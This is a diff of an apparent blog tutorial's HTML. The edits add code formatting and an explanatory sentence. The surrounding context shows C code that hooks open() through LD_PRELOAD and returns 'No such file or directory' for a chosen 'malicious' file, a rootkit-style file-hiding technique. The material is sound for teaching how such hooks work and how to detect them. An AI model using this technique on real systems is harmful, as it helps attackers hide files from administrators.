@@ -51,7 +51,7 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this code block I&amp;rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our &amp;ldquo;malicious&amp;rdquo; part to it.&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In this code block I&amp;rsquo;ve wrapped the original &lt;code>open&lt;/code> function with our implementation of the &lt;code>open&lt;/code> function. What is left now is to add our &amp;ldquo;malicious&amp;rdquo; part to it.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT; &lt;span style="color:#75715e">// Setting up the error to be ERROR NO ENTRY(ENOENT)
@@ -86,7 +86,8 @@
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>intercept_open.so syl.lys
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>./intercept_open.so cat syl.lys
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat: syl.lys: No such file or directory
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="combining-it-with-our-readdir" >Combining it with our &lt;code>readdir&lt;/code>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you can see the &lt;code>cat&lt;/code> command returns &lt;code>No such file or directory&lt;/code> which is exactly what we are aiming for.&lt;/p>
+&lt;h2 id="combining-it-with-our-readdir" >Combining it with our &lt;code>readdir&lt;/code>
 &lt;span>
 &lt;a href="#combining-it-with-our-readdir">
 &lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
